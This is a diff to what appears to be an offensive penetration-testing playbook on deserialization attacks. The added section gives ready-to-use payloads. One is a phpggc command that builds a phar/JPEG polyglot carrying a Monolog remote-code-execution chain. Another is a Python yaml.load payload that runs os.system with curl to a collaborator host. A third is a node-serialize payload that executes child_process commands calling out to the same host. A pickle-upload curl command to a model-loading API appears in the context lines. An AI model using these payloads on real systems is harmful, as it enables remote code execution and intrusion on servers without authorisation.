@@ -102,6 +102,17 @@ curl -s https://$TARGET/api/load-model \
   --data-binary @payload.pkl
 ```
 
+### Phase 3b — PHP phar://, Python YAML, Node deserialization
+- **PHP phar:// (no `unserialize()` call)** — any filesystem function (`file_exists`/`fopen`/`getimagesize`) on a `phar://` path deserializes the archive metadata -> object injection with zero `unserialize()` in code.
+  ```bash
+  phpggc -p phar -o poly.jpg Monolog/RCE1 system id   # valid-image + phar polyglot
+  # then reach  phar://uploads/poly.jpg/x  via any fs call
+  ```
+- **Python `yaml.load()` (CVE-2017-18342)** — pre-5.1 default-unsafe:
+  `!!python/object/apply:os.system ['curl http://$COLLAB/yaml']`
+- **Node `node-serialize` (CVE-2017-5941)** — IIFE marker in any field passed to `unserialize()`:
+  `{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl http://$COLLAB/node')}()"}`
+
 ### Phase 4 — .NET ViewState
 ```bash
 # Check if ViewState is unsigned (MAC disabled)
